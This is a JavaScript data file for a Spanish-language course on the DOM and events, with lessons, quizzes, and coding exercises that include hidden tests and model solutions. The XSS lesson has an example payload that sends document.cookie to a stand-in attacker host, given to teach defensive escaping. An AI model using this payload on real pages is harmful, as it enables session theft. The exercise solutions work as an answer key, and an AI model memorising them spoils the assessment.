window.CURSOS = window.CURSOS || {};
(CURSOS.javascript = CURSOS.javascript || []).push({
titulo: "El DOM y los eventos",
resumen: "Seleccionar y modificar elementos, crear contenido de forma segura, eventos, propagación, delegación, eventos propios y formularios",
nivel: "Intermedio",
color: "#c5ab2a",
lecciones: [

{
id:"js7l1",
titulo:"Seleccionar y modificar elementos",
claves:["El DOM es el árbol de objetos que representa la página","querySelector y querySelectorAll con selectores CSS; closest sube por los ancestros","textContent, classList, dataset y setAttribute para modificar"],
pasos:[
 {t:"info", eti:"La página como objetos", h:"¿Qué es el DOM?",
  c:`<p>Cuando el navegador lee el HTML, construye un árbol de objetos: el <b>DOM</b> (Document Object Model). JavaScript lee y modifica ese árbol, y el navegador redibuja la página.</p>
     <div class="dg dg-arbol"><div class="dg-tit">el HTML de una lista, como árbol</div>
<div class="rama" style="--n:0"><span class="nom carpeta">document</span></div>
<div class="rama" style="--n:1"><span class="nom carpeta">html</span></div>
<div class="rama" style="--n:2"><span class="nom carpeta">body</span></div>
<div class="rama" style="--n:3"><span class="nom carpeta">ul#tareas</span><span class="coment">el contenedor</span></div>
<div class="rama" style="--n:4"><span class="nom carpeta">li.tarea[data-id="1"]</span></div>
<div class="rama" style="--n:5"><span class="nom">"Comprar pan"</span><span class="coment">nodo de texto</span></div>
<div class="rama" style="--n:4"><span class="nom carpeta">li.tarea[data-id="2"]</span></div>
<div class="rama" style="--n:5"><span class="nom">button.borrar</span></div>
</div>
     <div class="termbox">const titulo = document.querySelector("h1");               // el primero que coincide
const botones = document.querySelectorAll(".btn");         // todos (NodeList estática)
const form = document.getElementById("registro");

titulo.textContent = "Bienvenido";          // cambiar el texto
titulo.classList.add("destacado");          // clases CSS
titulo.classList.toggle("oculto");
titulo.style.color = "tomato";              // estilo en línea
boton.setAttribute("aria-pressed", "true");
tarjeta.dataset.id;                          // lee data-id="42"
boton.closest("li");                         // el ancestro más cercano que coincide
lista.children; li.parentElement; li.nextElementSibling;   // navegar</div>`},
 {t:"par", p:"Empareja cada propiedad o método con su uso",
  pares:[["querySelector(\".item\")","Primer elemento que coincide con el selector"],["querySelectorAll(\"li\")","Todos los elementos que coinciden"],["textContent","Leer o cambiar el texto (sin interpretar HTML)"],["classList.toggle(\"x\")","Poner o quitar una clase"],["dataset.id","Leer el atributo data-id"],["closest(\"li\")","Subir hasta el ancestro que coincide"]],
  why:"Cambiar clases y dejar el aspecto al CSS es más limpio que tocar style directamente."},
 {t:"term", p:"En la consola del navegador, selecciona el primer elemento con la clase <code>precio</code>",
  prompt:">", sol:["document.querySelector(\".precio\")","document.querySelector('.precio')","document.querySelector(\".precio\");","document.querySelector('.precio');"],
  pista:"document.querySelector con el selector CSS de clase.",
  salida:`<span class="precio">24,90 €</span>`, why:"Los selectores son los mismos que en CSS: .clase, #id, etiqueta, [atributo]."},
 {t:"hueco", p:"Completa para marcar como activa la pestaña con <code>data-tab=\"ajustes\"</code>",
  tpl:"document.___('[data-tab=\"ajustes\"]').___.add(\"activa\");", banco:["querySelector","classList","getElementById","className","dataset"], sol:["querySelector","classList"],
  why:"Los selectores de atributo ([data-tab=\"…\"]) permiten enlazar HTML y JavaScript sin depender de clases de estilo."},
 {t:"opcion", p:"Haces <code>document.querySelectorAll(\"li\").map(...)</code> y obtienes <code>TypeError: map is not a function</code>. ¿Por qué?",
  ops:["No hay elementos li","querySelectorAll devuelve un NodeList, que tiene forEach pero no map; conviértelo con [...lista] o Array.from","map solo funciona con números","Falta await"],
  ok:1, why:"[...document.querySelectorAll(\"li\")].map(li => li.textContent) funciona."},
 {t:"codigo", p:"Simula <code>closest</code>: dado un nodo con <code>parent</code> y <code>tag</code>, devuelve el primer ancestro (o él mismo) con esa etiqueta",
  lenguaje:"js",
  c:`<p>En Node no hay DOM, así que modelamos los nodos como objetos. Imprime el <code>id</code> encontrado o <code>null</code>.</p>`,
  plantilla:`const ul = { tag: "ul", id: "lista", parent: null };
const li = { tag: "li", id: "t1", parent: ul };
const btn = { tag: "button", id: "b1", parent: li };
function closest(nodo, tag) {
  // sube por parent hasta encontrar el tag
}
console.log(closest(btn, "li")?.id ?? null);
console.log(closest(btn, "button")?.id ?? null);
console.log(closest(btn, "form")?.id ?? null);
`,
  pruebas:[{salida:"t1\nb1\nnull"}],
  pista:"let n = nodo; while (n) { if (n.tag === tag) return n; n = n.parent; } return null;",
  solucion:`const ul = { tag: "ul", id: "lista", parent: null };
const li = { tag: "li", id: "t1", parent: ul };
const btn = { tag: "button", id: "b1", parent: li };
function closest(nodo, tag) {
  let n = nodo;
  while (n) {
    if (n.tag === tag) return n;
    n = n.parent;
  }
  return null;
}
console.log(closest(btn, "li")?.id ?? null);
console.log(closest(btn, "button")?.id ?? null);
console.log(closest(btn, "form")?.id ?? null);`,
  why:"closest empieza por el propio elemento. Es la pieza clave de la delegación de eventos: del elemento pulsado subes hasta el que te interesa."},
 {t:"vf", p:"<code>querySelectorAll</code> devuelve una lista que se actualiza sola si luego añades elementos que coinciden.",
  ok:false, why:"Es una NodeList estática: una foto del momento. getElementsByClassName, en cambio, devuelve una HTMLCollection «viva»."}
]},

{
id:"js7l2",
titulo:"Crear contenido de forma segura",
claves:["createElement, append y replaceChildren para construir nodos","innerHTML con datos del usuario abre la puerta a XSS","Agrupa los cambios (DocumentFragment, una sola escritura) para no forzar repintados"],
pasos:[
 {t:"info", eti:"Construir", h:"Crear elementos",
  c:`<div class="termbox">const li = document.createElement("li");
li.textContent = tarea.titulo;             // seguro: nunca se interpreta como HTML
li.className = "tarea";
li.dataset.id = tarea.id;
lista.append(li);

lista.replaceChildren();                   // vaciar
li.remove();                               // quitar

// muchos elementos: construir fuera y añadir de una vez
const frag = document.createDocumentFragment();
for (const t of tareas) frag.append(crearFila(t));
lista.replaceChildren(frag);

// plantillas HTML reutilizables
const fila = document.querySelector("#tpl-fila").content.cloneNode(true);</div>`},
 {t:"info", eti:"Peligro", h:"XSS con innerHTML",
  c:`<div class="termbox">// un usuario pone como nombre:  &lt;img src=x onerror="fetch('https://malo.com?c=' + document.cookie)"&gt;
comentario.innerHTML = usuario.nombre;     // PELIGRO: se ejecuta el código del atacante
comentario.textContent = usuario.nombre;   // seguro: se muestra como texto</div>
     <p>El <b>Cross-Site Scripting</b> (XSS) permite ejecutar JavaScript ajeno en la página de otros usuarios: robar sesiones, hacer acciones en su nombre. Regla: <b>nunca metas datos de usuario en innerHTML</b>. Si necesitas HTML de usuario (un editor de texto enriquecido), sanéalo con una librería como DOMPurify. Frameworks como React escapan por defecto.</p>
     <div class="nota ojo"><b class="tit">Rendimiento</b>Leer medidas (<code>offsetHeight</code>, <code>getBoundingClientRect</code>) justo después de escribir estilos obliga al navegador a recalcular la maquetación en ese instante. Dentro de un bucle, es el famoso «layout thrashing»: agrupa primero las lecturas y luego las escrituras.</div>`},
 {t:"opcion", p:"Vas a mostrar el nombre que escribió un usuario dentro de un <code>&lt;span&gt;</code>. ¿Qué usas?",
  ops:["span.innerHTML = nombre","span.textContent = nombre","document.write(nombre)","eval(nombre)"],
  ok:1, why:"textContent nunca interpreta etiquetas: inmune a XSS."},
 {t:"par", p:"Empareja cada práctica con su nivel de riesgo",
  pares:[["textContent con datos del usuario","Seguro"],["innerHTML con datos del usuario","Vulnerable a XSS"],["innerHTML con HTML saneado por DOMPurify","Aceptable si es imprescindible"],["eval con datos externos","Nunca"]],
  why:"Una Content-Security-Policy estricta añade otra capa de defensa."},
 {t:"codigo", p:"Escribe <code>escaparHtml(texto)</code>, que sustituya <code>&amp; &lt; &gt; \" '</code> por sus entidades, y úsalo con la entrada",
  lenguaje:"js",
  c:`<p>Entidades: <code>&amp;amp;</code>, <code>&amp;lt;</code>, <code>&amp;gt;</code>, <code>&amp;quot;</code> y <code>&amp;#39;</code>. El <code>&amp;</code> tiene que ir el primero.</p>`,
  plantilla:`function escaparHtml(texto) {
  // completa
}
const entrada = require("fs").readFileSync(0, "utf8").trim();
console.log(escaparHtml(entrada));
`,
  pruebas:[{entrada:"<b>Hola & adiós</b>\n", salida:"&lt;b&gt;Hola &amp; adiós&lt;/b&gt;"},{entrada:"<img src=x onerror=\"alert('x')\">\n", salida:"&lt;img src=x onerror=&quot;alert(&#39;x&#39;)&quot;&gt;", oculta:true}],
  pista:"texto.replaceAll(\"&\", \"&amp;\").replaceAll(\"<\", \"&lt;\")... en ese orden.",
  solucion:`function escaparHtml(texto) {
  return texto
    .replaceAll("&", "&amp;")
    .replaceAll("<", "&lt;")
    .replaceAll(">", "&gt;")
    .replaceAll('"', "&quot;")
    .replaceAll("'", "&#39;");
}
const entrada = require("fs").readFileSync(0, "utf8").trim();
console.log(escaparHtml(entrada));`,
  why:"Si escapas & al final, estropearías las entidades que acabas de crear (&lt; se volvería &amp;lt;). Es lo que hacen por ti React o textContent."},
 {t:"codigo", p:"Construye el HTML de una lista de tareas escapando los títulos y marcando con la clase <code>hecha</code> las terminadas",
  lenguaje:"js",
  plantilla:`const esc = s => s.replaceAll("&", "&amp;").replaceAll("<", "&lt;").replaceAll(">", "&gt;");
const tareas = [{ titulo: "Pan & leche", hecha: true }, { titulo: "<script>", hecha: false }];
// imprime <ul><li class="hecha">...</li><li>...</li></ul> en una sola línea
`,
  pruebas:[{salida:"<ul><li class=\"hecha\">Pan &amp; leche</li><li>&lt;script&gt;</li></ul>"}],
  pista:"`<ul>${tareas.map(t => `<li${t.hecha ? ' class=\"hecha\"' : ''}>${esc(t.titulo)}</li>`).join(\"\")}</ul>`",
  solucion:`const esc = s => s.replaceAll("&", "&amp;").replaceAll("<", "&lt;").replaceAll(">", "&gt;");
const tareas = [{ titulo: "Pan & leche", hecha: true }, { titulo: "<script>", hecha: false }];
const filas = tareas.map(t => \`<li\${t.hecha ? ' class="hecha"' : ""}>\${esc(t.titulo)}</li>\`).join("");
console.log(\`<ul>\${filas}</ul>\`);`,
  why:"Generar HTML con plantillas es habitual (en el servidor o en un innerHTML único), pero solo es seguro si cada dato se escapa."},
 {t:"vf", p:"XSS solo es un problema si la aplicación maneja pagos.",
  ok:false, why:"Cualquier XSS permite actuar como la víctima: leer sus datos, cambiar su contraseña o publicar en su nombre."}
]},

{
id:"js7l3",
titulo:"Eventos",
claves:["addEventListener(tipo, manejador) reacciona a clics, teclas, envíos...","El objeto event da detalles: target, key, preventDefault()","Delegación: un solo manejador en el padre para muchos hijos"],
pasos:[
 {t:"info", eti:"Reaccionar", h:"addEventListener",
  c:`<div class="termbox">boton.addEventListener("click", (event) =&gt; {
  console.log("Pulsado", event.target);
});

campo.addEventListener("input", e =&gt; buscar(e.target.value));
document.addEventListener("keydown", e =&gt; { if (e.key === "Escape") cerrar(); });

formulario.addEventListener("submit", (e) =&gt; {
  e.preventDefault();                       // que no recargue la página
  const datos = new FormData(formulario);
  enviar(Object.fromEntries(datos));
});

boton.removeEventListener("click", manejador);   // necesita la MISMA función</div>`},
 {t:"info", eti:"Un manejador para todos", h:"Delegación de eventos",
  c:`<p>Los eventos <b>suben</b> (burbujeo) desde el elemento pulsado hasta el documento. Así puedes escuchar en el contenedor en vez de en cada elemento, incluso en los que se añadan después:</p>
     <div class="termbox">lista.addEventListener("click", (e) =&gt; {
  const boton = e.target.closest("button[data-borrar]");
  if (!boton || !lista.contains(boton)) return;
  borrarTarea(boton.dataset.borrar);
});</div>
     <p><code>e.target</code> es el elemento exacto donde se hizo clic (quizá un <code>&lt;span&gt;</code> dentro del botón); <code>e.currentTarget</code> es el elemento que tiene el listener (la lista).</p>`},
 {t:"par", p:"Empareja cada evento con cuándo se dispara",
  pares:[["click","Al pulsar un elemento"],["input","Cada vez que cambia el valor de un campo"],["change","Al confirmar el cambio (salir del campo, elegir opción)"],["submit","Al enviar un formulario"],["keydown","Al pulsar una tecla"],["DOMContentLoaded","Cuando el HTML está cargado y procesado"]],
  why:"Para formularios, escucha submit (funciona también con Enter), no el clic del botón."},
 {t:"opcion", p:"Tienes una lista con 1.000 filas y cada una un botón de borrar que se añaden dinámicamente. ¿Mejor enfoque?",
  ops:["Un listener en cada botón al crearlo","Un único listener en la lista usando delegación con e.target.closest","Recargar la página","Un setInterval que compruebe clics"],
  ok:1, why:"Menos memoria, y funciona automáticamente con las filas nuevas."},
 {t:"opcion", p:"Con delegación en la lista, el usuario pulsa el icono <code>&lt;svg&gt;</code> dentro del botón y <code>e.target.dataset.borrar</code> es undefined. ¿Qué haces?",
  ops:["Quitar el icono","Usar e.target.closest(\"[data-borrar]\") para subir hasta el botón","Usar e.currentTarget.dataset.borrar","Poner el data-borrar en el svg"],
  ok:1, why:"e.target es el elemento más profundo pulsado. closest sube hasta el que tiene el dato. currentTarget sería la lista entera."},
 {t:"codigo", p:"Implementa un <code>debounce(fn, ms)</code> y simula tecleo: solo debe ejecutarse la última búsqueda",
  lenguaje:"js",
  c:`<p>El buscador llama a la función en cada tecla. Con debounce de 50 ms y cuatro pulsaciones seguidas, solo debe imprimirse <code>buscar: java</code>.</p>`,
  plantilla:`function debounce(fn, ms) {
  // cancela el temporizador anterior y programa uno nuevo
  return fn;
}
const buscar = debounce(q => console.log("buscar:", q), 50);
for (const q of ["j", "ja", "jav", "java"]) buscar(q);
`,
  pruebas:[{salida:"buscar: java"}],
  pista:"let t; return (...args) => { clearTimeout(t); t = setTimeout(() => fn(...args), ms); };",
  solucion:`function debounce(fn, ms) {
  let t;
  return (...args) => {
    clearTimeout(t);
    t = setTimeout(() => fn(...args), ms);
  };
}
const buscar = debounce(q => console.log("buscar:", q), 50);
for (const q of ["j", "ja", "jav", "java"]) buscar(q);`,
  why:"Cada pulsación cancela la anterior: una petición al servidor en lugar de cuatro. El temporizador vive en el closure."},
 {t:"vf", p:"<code>event.preventDefault()</code> en un submit evita que el navegador recargue la página.",
  ok:true, why:"Imprescindible cuando envías el formulario con fetch."}
]},

{
id:"js7n1",
titulo:"Propagación, eventos propios y formularios",
claves:["Fases: captura (de arriba abajo), objetivo y burbujeo (de abajo arriba)","Opciones de addEventListener: once, passive, capture y signal","CustomEvent para comunicar componentes; FormData y la API de validación para formularios"],
pasos:[
 {t:"info", eti:"El viaje de un evento", h:"Captura y burbujeo",
  c:`<div class="dg"><div class="dg-tit">clic en un botón dentro de un li dentro de un ul</div>
<div class="dg-cols">
<div class="dg-col"><div class="dg-col-tit">1. captura (baja)</div><div class="dg-vert">
<div class="dg-caja base">document</div><div class="dg-caja">ul</div><div class="dg-caja">li</div></div></div>
<div class="dg-col"><div class="dg-col-tit">2. objetivo</div><div class="dg-pila">
<div class="dg-caja acento">button</div></div></div>
<div class="dg-col"><div class="dg-col-tit">3. burbujeo (sube)</div><div class="dg-vert">
<div class="dg-caja">li</div><div class="dg-caja">ul</div><div class="dg-caja base">document</div></div></div>
</div></div>
     <div class="termbox">el.addEventListener("click", fn);                     // burbujeo (lo normal)
el.addEventListener("click", fn, { capture: true });  // en la bajada
e.stopPropagation();          // no sigue subiendo (úsalo con mucha prudencia)

el.addEventListener("click", fn, { once: true });     // se quita solo tras la primera vez
window.addEventListener("scroll", fn, { passive: true });   // promete no llamar a preventDefault: scroll fluido

const ctrl = new AbortController();
el.addEventListener("click", fn, { signal: ctrl.signal });
ctrl.abort();                 // quita todos los listeners con esa señal</div>`},
 {t:"info", eti:"Comunicar y validar", h:"CustomEvent y formularios",
  c:`<div class="termbox">// un componente avisa sin conocer a quien escucha
carrito.dispatchEvent(new CustomEvent("carrito:cambiado", {
  detail: { total: 42 }, bubbles: true,
}));
document.addEventListener("carrito:cambiado", e =&gt; pintarTotal(e.detail.total));

// formularios
form.addEventListener("submit", e =&gt; {
  e.preventDefault();
  const datos = Object.fromEntries(new FormData(form));   // { email: "...", edad: "31" } (todo texto)
  if (datos.password !== datos.repetir) {
    form.repetir.setCustomValidity("Las contraseñas no coinciden");
  } else form.repetir.setCustomValidity("");
  if (!form.reportValidity()) return;                     // muestra los mensajes nativos
  enviar(datos);
});</div>
     <p>Los atributos HTML (<code>required</code>, <code>type="email"</code>, <code>minlength</code>, <code>pattern</code>) dan validación gratis y accesible. La validación del navegador es comodidad: <b>el servidor debe validar siempre</b>.</p>`},
 {t:"orden", p:"Ordena por dónde pasa un clic en un <code>button</code> dentro de un <code>li</code> dentro de un <code>ul</code>, con listeners de captura y de burbujeo en ul",
  items:["Listener de captura del ul","Listener del propio button","Listener de burbujeo del li","Listener de burbujeo del ul"],
  why:"Primero baja (captura), llega al objetivo y luego sube (burbujeo)."},
 {t:"par", p:"Empareja cada opción de addEventListener con su efecto",
  pares:[["once: true","Se elimina tras ejecutarse una vez"],["passive: true","Promete no cancelar el evento: mejora el scroll"],["capture: true","Escucha en la fase de bajada"],["signal","Permite quitar el listener con AbortController"]],
  why:"signal es la forma moderna de limpiar muchos listeners de golpe al desmontar un componente."},
 {t:"opcion", p:"Un modal cierra al hacer clic fuera escuchando en document. Pero al pulsar el botón «Abrir», se abre y se cierra al instante. ¿Por qué?",
  ops:["El botón está roto","El mismo clic que abre el modal sigue subiendo (burbujeo) hasta document, donde el otro listener lo cierra","El modal no tiene z-index","Falta preventDefault en document"],
  ok:1, why:"Soluciones: comprobar en el listener de document si el clic vino de dentro del modal o del botón (closest), o registrar ese listener después del clic que abre."},
 {t:"codigo", p:"Implementa un mini sistema de eventos: <code>on(tipo, fn)</code> devuelve una función para desuscribirse, y <code>emit(tipo, datos)</code> avisa a todos",
  lenguaje:"js",
  plantilla:`function crearBus() {
  // Map de tipo -> Set de funciones
  return { on() {}, emit() {} };
}
const bus = crearBus();
const quitar = bus.on("guardado", d => console.log("A", d.id));
bus.on("guardado", d => console.log("B", d.id));
bus.emit("guardado", { id: 1 });
quitar();
bus.emit("guardado", { id: 2 });
bus.emit("otro", {});
`,
  pruebas:[{salida:"A 1\nB 1\nB 2"}],
  pista:"const oyentes = new Map(); on(t, fn) { if (!oyentes.has(t)) oyentes.set(t, new Set()); oyentes.get(t).add(fn); return () => oyentes.get(t).delete(fn); } emit(t, d) { for (const fn of oyentes.get(t) ?? []) fn(d); }",
  solucion:`function crearBus() {
  const oyentes = new Map();
  return {
    on(tipo, fn) {
      if (!oyentes.has(tipo)) oyentes.set(tipo, new Set());
      oyentes.get(tipo).add(fn);
      return () => oyentes.get(tipo).delete(fn);
    },
    emit(tipo, datos) {
      for (const fn of oyentes.get(tipo) ?? []) fn(datos);
    },
  };
}
const bus = crearBus();
const quitar = bus.on("guardado", d => console.log("A", d.id));
bus.on("guardado", d => console.log("B", d.id));
bus.emit("guardado", { id: 1 });
quitar();
bus.emit("guardado", { id: 2 });
bus.emit("otro", {});`,
  why:"Es el patrón observador que hay detrás de addEventListener, del EventEmitter de Node y de muchos gestores de estado."},
 {t:"codigo", p:"Valida los datos de un formulario (como los daría <code>Object.fromEntries(new FormData(form))</code>) e imprime los errores o <code>ok</code>",
  lenguaje:"js",
  c:`<p>Reglas: <code>email</code> con una @; <code>edad</code> numérica y ≥ 18; <code>password</code> de al menos 8 caracteres e igual a <code>repetir</code>. Imprime un error por línea con el formato <code>campo: mensaje</code>, en ese orden.</p>`,
  plantilla:`function validar(d) {
  const errores = [];
  // completa
  return errores;
}
const casos = [
  { email: "ana@x.es", edad: "30", password: "12345678", repetir: "12345678" },
  { email: "ana", edad: "16", password: "123", repetir: "124" },
];
for (const c of casos) {
  const e = validar(c);
  console.log(e.length ? e.join(" | ") : "ok");
}
`,
  pruebas:[{salida:"ok\nemail: no válido | edad: debe ser mayor de edad | password: mínimo 8 caracteres | repetir: no coincide"}],
  pista:"FormData da textos: Number(d.edad). Empuja \"campo: mensaje\" al array por cada regla que falle.",
  solucion:`function validar(d) {
  const errores = [];
  if (!d.email.includes("@")) errores.push("email: no válido");
  const edad = Number(d.edad);
  if (!Number.isFinite(edad) || edad < 18) errores.push("edad: debe ser mayor de edad");
  if (d.password.length < 8) errores.push("password: mínimo 8 caracteres");
  if (d.password !== d.repetir) errores.push("repetir: no coincide");
  return errores;
}
const casos = [
  { email: "ana@x.es", edad: "30", password: "12345678", repetir: "12345678" },
  { email: "ana", edad: "16", password: "123", repetir: "124" },
];
for (const c of casos) {
  const e = validar(c);
  console.log(e.length ? e.join(" | ") : "ok");
}`,
  why:"Devolver todos los errores a la vez (no solo el primero) es mejor experiencia: el usuario corrige todo de una pasada."},
 {t:"vf", p:"Si el formulario tiene <code>required</code> y <code>type=\"email\"</code>, el servidor ya no necesita validar esos campos.",
  ok:false, why:"Cualquiera puede saltarse el navegador (curl, DevTools). La validación del cliente es para la experiencia; la del servidor, para la seguridad."}
]}

]});
